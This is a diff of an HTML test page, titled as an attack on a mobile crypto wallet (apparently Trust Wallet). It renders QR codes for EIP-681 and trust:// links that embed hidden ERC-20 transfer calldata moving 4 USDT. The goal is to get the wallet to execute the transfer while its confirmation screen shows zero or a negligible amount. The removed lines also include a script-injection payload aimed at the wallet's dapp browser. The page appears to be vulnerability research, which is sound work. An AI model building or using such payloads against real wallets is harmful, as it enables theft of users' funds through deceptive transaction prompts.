@@ -3,132 +3,97 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TW Attack — Android Pure Data Focus v2</title>
+<title>TW Attack — Android Pure Data v3</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f1a; color: #e0e0f0; padding: 20px; max-width: 800px; margin: 0 auto; }
   h1 { font-size: 22px; margin-bottom: 6px; color: #f0f0ff; }
   .subtitle { color: #8888bb; font-size: 14px; margin-bottom: 24px; }
-  h2 { font-size: 16px; color: #bbbbff; margin: 20px 0 10px; border-bottom: 1px solid #2a2a3a; padding-bottom: 6px; }
-  .test-card { background: #1a1a2e; border: 1px solid #2a2a3a; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
-  .test-card .label { font-size: 13px; color: #8888bb; font-family: monospace; margin-bottom: 4px; }
-  .test-card .uri-box { font-size: 11px; color: #aaccff; word-break: break-all; background: #0a0a15; padding: 8px; border-radius: 6px; margin: 6px 0 10px; font-family: monospace; }
-  .qr-container { text-align: center; margin: 8px 0; }
-  .qr-container img { border-radius: 8px; width: 200px; height: 200px; border: 2px solid #2a2a3a; }
-  .status { font-size: 12px; margin-top: 8px; padding: 6px 10px; border-radius: 4px; }
-  .status.hypothesis { background: #1a2a1a; color: #88dd88; border-left: 3px solid #44aa44; }
-  .status.note { background: #2a1a1a; color: #dd8888; border-left: 3px solid #aa4444; }
-  .status.control { background: #1a1a2a; color: #8888dd; border-left: 3px solid #4444aa; }
-  .details { margin-top: 20px; }
-  .details summary { color: #8888bb; cursor: pointer; font-size: 13px; }
-  .result-input { width: 100%; padding: 8px; border-radius: 6px; border: 1px solid #3a3a5a; background: #0a0a15; color: #e0e0f0; font-size: 13px; margin-top: 6px; }
+  h2 { font-size: 15px; color: #bbbbff; margin: 16px 0 6px; border-bottom: 1px solid #2a2a3a; padding-bottom: 6px; }
+  .card { background: #1a1a2e; border: 1px solid #2a2a3a; border-radius: 12px; padding: 16px; margin-bottom: 14px; }
+  .uri-box { font-size: 10px; color: #aaccff; word-break: break-all; background: #0a0a15; padding: 8px; border-radius: 6px; margin: 6px 0 10px; font-family: monospace; }
+  .qr-row { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+  .qr-cell { text-align: center; }
+  .qr-cell img { border-radius: 8px; width: 180px; height: 180px; border: 2px solid #2a2a3a; background: white; padding: 4px; }
+  .qr-cell .letter { font-size: 18px; font-weight: bold; color: #bbbbff; margin-bottom: 4px; }
+  .hypothesis { background: #1a2a1a; color: #88dd88; border-left: 3px solid #44aa44; font-size: 12px; padding: 6px 10px; border-radius: 4px; margin-top: 8px; }
 </style>
 </head>
 <body>
 
-<h1>🔬 Android Pure Data Focus — v2</h1>
-<p class="subtitle">QR codes rendered via Google Charts API (no JS deps). Scan with built-in camera (top-right corner).</p>
+<h1>🔬 Android Pure Data Focus — v3</h1>
+<p class="subtitle">QR via api.qrserver.com. Scan with built-in camera (top-right corner).</p>
 
-<div class="status note" style="margin-bottom:20px;">
-<strong>⚡ Key Context:</strong> Test C proved wallet accepts + executes (gas paid) but 4 USDT didn't transfer. Previous tests with both function params AND `data` were ambiguous. <strong>These tests remove ALL function params — only `data` remains.</strong>
+<div style="background:#2a1a1a;color:#dd8888;border-left:3px solid #aa4444;font-size:12px;padding:8px 12px;border-radius:4px;margin-bottom:16px;">
+<strong>⚡ Key Context:</strong> Test C proved wallet accepts + executes (gas paid) but 4 USDT didn't transfer. Tests with BOTH function params AND <code>data</code> were ambiguous. <strong>These tests remove ALL function params — only <code>data</code> remains.</strong>
 </div>
 
-<script>
-// --- CONFIG ---
-const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-const RECIPIENT = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
-const ABI_CALL = '0xa9059cbb' +
-  '000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266' +
-  '00000000000000000000000000000000000000000000000000000000003d0900';
+<div id="tests"></div>
 
-const TESTS = [
-  { id: 'qr-A', label: 'A — Pure EIP-681, no function, ONLY data', 
-    uri: 'ethereum:' + USDT + '@1?data=' + ABI_CALL },
-  { id: 'qr-B', label: 'B — EIP-681 /transfer with ONLY data',
-    uri: 'ethereum:' + USDT + '@1/transfer?data=' + ABI_CALL },
-  { id: 'qr-C', label: 'C — trust:// + asset + tiny amount + data',
-    uri: 'trust://send?asset=' + USDT + '&address=' + RECIPIENT + '&amount=1&data=' + ABI_CALL },
-  { id: 'qr-D', label: 'D — trust:// + asset + address + data (NO amount)',
-    uri: 'trust://send?asset=' + USDT + '&address=' + RECIPIENT + '&data=' + ABI_CALL },
-  { id: 'qr-E', label: 'E — trust:// + asset + amount=1 (control, via camera)',
-    uri: 'trust://send?asset=' + USDT + '&address=' + RECIPIENT + '&amount=1&data=' + ABI_CALL },
-  { id: 'qr-F', label: 'F — trust://dapp?url=ENCODED (dapp browser with malicious payload)',
-    uri: 'trust://dapp?url=data:text/html,<script>alert(1)</script>' }
-];
-
-function qrUrl(str) {
-  return 'https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=' + encodeURIComponent(str) + '&chld=H|0';
-}
-
-document.write(TESTS.map(function(t) {
-  return '<div class="test-card">' +
-    '<h2>' + t.label + '</h2>' +
-    '<div class="label">URI</div>' +
-    '<div class="uri-box">' + t.uri + '</div>' +
-    '<div class="qr-container"><img src="' + qrUrl(t.uri) + '" alt="QR Code" crossorigin="anonymous"></div>' +
-    '<div class="status hypothesis"><strong>Prediction:</strong> See table below for each letter.</div>' +
-    '<input class="result-input" placeholder="What shows on confirmation screen? NEXT enabled? After confirm?" id="r-' + t.id + '">' +
-    '</div>';
-}).join(''));
-</script>
-
-<h2>📋 Test Predictions</h2>
-<div style="overflow-x:auto;font-size:12px;">
-<table style="width:100%;border-collapse:collapse;margin-top:6px;">
+<h2>📋 Predictions</h2>
+<table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:20px;">
 <thead>
 <tr style="background:#2a2a3a;">
-  <th style="padding:8px;text-align:left;">Test</th>
-  <th style="padding:8px;text-align:left;">Format</th>
-  <th style="padding:8px;text-align:left;">Expected Screen</th>
-  <th style="padding:8px;text-align:left;">Data Pass?</th>
+  <th style="padding:6px 8px;text-align:left;">ID</th>
+  <th style="padding:6px 8px;text-align:left;">Format</th>
+  <th style="padding:6px 8px;text-align:left;">Expected Screen</th>
+  <th style="padding:6px 8px;text-align:left;">Data?</th>
 </tr>
 </thead>
 <tbody>
-<tr style="border-bottom:1px solid #2a2a3a;">
-  <td style="padding:8px;"><strong>A</strong></td>
-  <td style="padding:8px;font-family:monospace;font-size:10px;">ethereum:0xUSDT@1?data=...</td>
-  <td style="padding:8px;">"Contract Interaction" or "Interact with 0xUSDT" — 0 ETH</td>
-  <td style="padding:8px;color:#88dd88;">✅ Most likely to pass</td>
-</tr>
-<tr style="border-bottom:1px solid #2a2a3a;">
-  <td style="padding:8px;"><strong>B</strong></td>
-  <td style="padding:8px;font-family:monospace;font-size:10px;">ethereum:0xUSDT@1/transfer?data=...</td>
-  <td style="padding:8px;">Might error (no required params), might show generic</td>
-  <td style="padding:8px;color:#dddd88;">🟡 Depends on fallback</td>
-</tr>
-<tr style="border-bottom:1px solid #2a2a3a;">
-  <td style="padding:8px;"><strong>C</strong></td>
-  <td style="padding:8px;font-family:monospace;font-size:10px;">trust://?asset=USDT&amount=1&data=...</td>
-  <td style="padding:8px;">Shows 0.000001 USDT — erc20_transfer</td>
-  <td style="padding:8px;color:#dd8888;">❌ erc20_transfer ignores data</td>
-</tr>
-<tr style="border-bottom:1px solid #2a2a3a;">
-  <td style="padding:8px;"><strong>D</strong></td>
-  <td style="padding:8px;font-family:monospace;font-size:10px;">trust://?asset=USDT&address=...&data=...</td>
-  <td style="padding:8px;">Shows 0 USDT — may hit minimum check</td>
-  <td style="padding:8px;color:#dddd88;">🟡 No amount → no erc20_transfer, but may block</td>
-</tr>
-<tr style="border-bottom:1px solid #2a2a3a;">
-  <td style="padding:8px;"><strong>E</strong></td>
-  <td style="padding:8px;font-family:monospace;font-size:10px;">trust://?asset=USDT&amount=1&data=...</td>
-  <td style="padding:8px;">Same as C — control via camera</td>
-  <td style="padding:8px;color:#dd8888;">❌ Same as C, confirming no camera diff</td>
-</tr>
+<tr style="border-bottom:1px solid #2a2a3a;"><td style="padding:6px 8px;font-weight:bold;">A</td><td style="padding:6px 8px;font-family:monospace;font-size:10px;">ethereum:0xUSDT@1?data=...</td><td style="padding:6px 8px;">"Contract Interaction" — 0 ETH shown</td><td style="padding:6px 8px;color:#88dd88;">✅ Most likely</td></tr>
+<tr style="border-bottom:1px solid #2a2a3a;"><td style="padding:6px 8px;font-weight:bold;">B</td><td style="padding:6px 8px;font-family:monospace;font-size:10px;">ethereum:0xUSDT@1/transfer?data=...</td><td style="padding:6px 8px;">May show error or generic interaction</td><td style="padding:6px 8px;color:#dddd88;">🟡 Depends</td></tr>
+<tr style="border-bottom:1px solid #2a2a3a;"><td style="padding:6px 8px;font-weight:bold;">C</td><td style="padding:6px 8px;font-family:monospace;font-size:10px;">trust://send?asset=USDT&amount=1&data=...</td><td style="padding:6px 8px;">0.000001 USDT — erc20_transfer</td><td style="padding:6px 8px;color:#dd8888;">❌ Ignores data</td></tr>
+<tr style="border-bottom:1px solid #2a2a3a;"><td style="padding:6px 8px;font-weight:bold;">D</td><td style="padding:6px 8px;font-family:monospace;font-size:10px;">trust://send?asset=USDT&address=...&data=...</td><td style="padding:6px 8px;">0 USDT — may block minimum</td><td style="padding:6px 8px;color:#dddd88;">🟡 Maybe</td></tr>
 </tbody>
 </table>
-</div>
 
-<div class="details">
-<details>
-  <summary>📄 Raw URIs for manual entry</summary>
-  <pre style="font-size:11px;color:#666688;background:#0a0a15;padding:8px;border-radius:4px;margin:6px 0;white-space:pre-wrap;word-break:break-all;" id="raw"></pre>
-</details>
-</div>
+<h2>📝 Results</h2>
+<div id="results"></div>
 
 <script>
-var raw = '';
-TESTS.forEach(function(t) { raw += '[' + t.label + ']\n' + t.uri + '\n\n'; });
-document.getElementById('raw').textContent = raw;
+const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const RECIPIENT = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
+// transfer(0xf39..., 4000000 = 4 USDT with 6 decimals)
+const CALLCALL = '0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900';
+
+const TESTS = [
+  { id: 'A', label: 'A — EIP-681 no fn, ONLY data',
+    uri: 'ethereum:' + USDT + '@1?data=' + CALLCALL },
+  { id: 'B', label: 'B — EIP-681 /transfer with ONLY data',
+    uri: 'ethereum:' + USDT + '@1/transfer?data=' + CALLCALL },
+  { id: 'C', label: 'C — trust:// + asset + amount=1 + data',
+    uri: 'trust://send?asset=' + USDT + '&address=' + RECIPIENT + '&amount=1&data=' + CALLCALL },
+  { id: 'D', label: 'D — trust:// + asset + address + data (NO amount)',
+    uri: 'trust://send?asset=' + USDT + '&address=' + RECIPIENT + '&data=' + CALLCALL },
+];
+
+function qrSrc(str) {
+  return 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(str);
+}
+
+// Render QR grid
+var html = '<div class="qr-row">';
+TESTS.forEach(function(t) {
+  html += '<div class="qr-cell">' +
+    '<div class="letter">' + t.id + '</div>' +
+    '<img src="' + qrSrc(t.uri) + '" alt="QR ' + t.id + '" loading="lazy">' +
+    '</div>';
+});
+html += '</div>';
+document.getElementById('tests').innerHTML = html;
+
+// Render result inputs
+var rhtml = '';
+TESTS.forEach(function(t) {
+  rhtml += '<div class="card">' +
+    '<strong>' + t.label + '</strong>' +
+    '<div class="uri-box">' + t.uri + '</div>' +
+    '<div class="hypothesis">Prediction: see table above.</div>' +
+    '<textarea rows="2" style="width:100%;padding:8px;border-radius:6px;border:1px solid #3a3a5a;background:#0a0a15;color:#e0e0f0;font-size:12px;margin-top:6px;font-family:inherit;" placeholder="What shows on screen? NEXT enabled? What happens after confirm?" id="r-' + t.id + '"></textarea>' +
+    '</div>';
+});
+document.getElementById('results').innerHTML = rhtml;
 </script>
 
 </body>
